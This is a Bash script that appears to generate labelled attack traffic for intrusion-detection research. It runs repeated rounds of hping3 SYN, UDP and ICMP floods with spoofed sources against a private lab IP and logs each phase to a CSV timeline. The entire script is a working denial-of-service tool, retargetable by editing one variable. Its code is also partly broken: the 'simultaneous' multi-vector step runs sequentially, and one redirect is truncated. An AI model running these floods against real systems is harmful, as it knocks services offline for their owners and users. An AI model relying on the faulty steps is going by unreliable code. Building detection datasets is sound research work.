#!/usr/bin/env bash
TARGET="192.168.20.10"
TARGET_PORT="80"
TIMELINE="attack_timeline.csv"
ROUNDS=4  # Set higher for longer collection (4 rounds ≈ 40 minutes)
echo "timestamp_start,timestamp_end,attack_type,rate_profile,round" > "$TIMELINE"
log_phase() {
    local start="$1"
    local end="$2"
    local attack="$3"
    local rate="$4"
    local round="$5"
    echo "$start,$end,$attack,$rate,$round" >> "$TIMELINE"
}
run_attack() {
    local name="$1"
    local rate="$2"
    local duration="$3"
    local round="$4"
    shift 4
    local cmd=("$@")
    local start_ts
    start_ts=$(date -u +"%Y-%m-%d %H:%M:%S")
    echo "=================================================="
    echo "[+] Round $round: Starting $name ($rate) for ${duration}s"
    echo "=================================================="
    sudo timeout --preserve-status -s 2 "$duration" "${cmd[@]}" > /dev/null 2>&1
    local end_ts
    end_ts=$(date -u +"%Y-%m-%d %H:%M:%S")
    log_phase "$start_ts" "$end_ts" "$name" "$rate" "$round"
    echo "[-] Finished: $name"
}
cooldown() {
    local duration="$1"
    local round="$2"
    local start_ts
    start_ts=$(date -u +"%Y-%m-%d %H:%M:%S")
    echo "[*] Cooldown/Baseline window for ${duration}s (Benign traffic only)..."
    sleep "$duration"
    local end_ts
    end_ts=$(date -u +"%Y-%m-%d %H:%M:%S")
    log_phase "$start_ts" "$end_ts" "Benign" "Normal" "$round"
}
# --- INITIAL SYSTEM BASELINE --
echo "[*] Capturing Initial Clean Baseline (60s)..."
cooldown 60 0
# --- MAIN EXPERIMENT LOOP --
for r in $(seq 1 $ROUNDS); do
    echo "##################################################"
    echo "             STARTING CYCLE $r OF $ROUNDS         "
    echo "##################################################"
    # 1. TCP SYN Flood - Volumetric
    run_attack "TCP_SYN" "Volumetric" 45 "$r" \
        hping3 -S --flood --rand-source -p "$TARGET_PORT" "$TARGET"
    cooldown 30 "$r"
    # 2. TCP SYN Flood - Low-Rate Stealth (200 pps = u5000 interval)
    run_attack "TCP_SYN" "Low-Rate" 60 "$r" \
        hping3 -S -i u5000 --rand-source -p "$TARGET_PORT" "$TARGET"
    cooldown 30 "$r"
    # 3. UDP Flood - High Rate
    run_attack "UDP_Flood" "Volumetric" 45 "$r" \
        hping3 --udp --flood --rand-source -p "$TARGET_PORT" "$TARGET"
    cooldown 30 "$r"
    # 4. ICMP Flood - Pulsating / Burst Mode (5 pulses: 6s on, 4s off)
    echo "[+] Round $r: Starting ICMP Pulsating Flood (5 bursts)..."
    for b in {1..5}; do
        run_attack "ICMP_Burst" "Burst_${b}_of_5" 6 "$r" \
            hping3 --icmp --flood --rand-source "$TARGET"
        sleep 4
    done
    cooldown 45 "$r"
    # 5. Mixed Multi-Vector Attack (Simultaneous SYN + UDP)
    start_m_ts=$(date -u +"%Y-%m-%d %H:%M:%S")
    echo "[+] Round $r: Starting Multi-Vector Flood (SYN + UDP) for 40s..."
    sudo timeout --preserve-status -s 2 40 hping3 -S --flood --rand-source -p "$TARGET_PORT" "$TARGET" > /dev/null 2>&1 
    sudo timeout --preserve-status -s 2 40 hping3 --udp --flood --rand-source -p "$TARGET_PORT" "$TARGET" > /dev/null 2>
    wait
    end_m_ts=$(date -u +"%Y-%m-%d %H:%M:%S")
    log_phase "$start_m_ts" "$end_m_ts" "Multi_Vector_SYN_UDP" "Volumetric" "$r"
    cooldown 60 "$r"
done
echo "[*] Entire campaign complete! Output saved to $TIMELINE."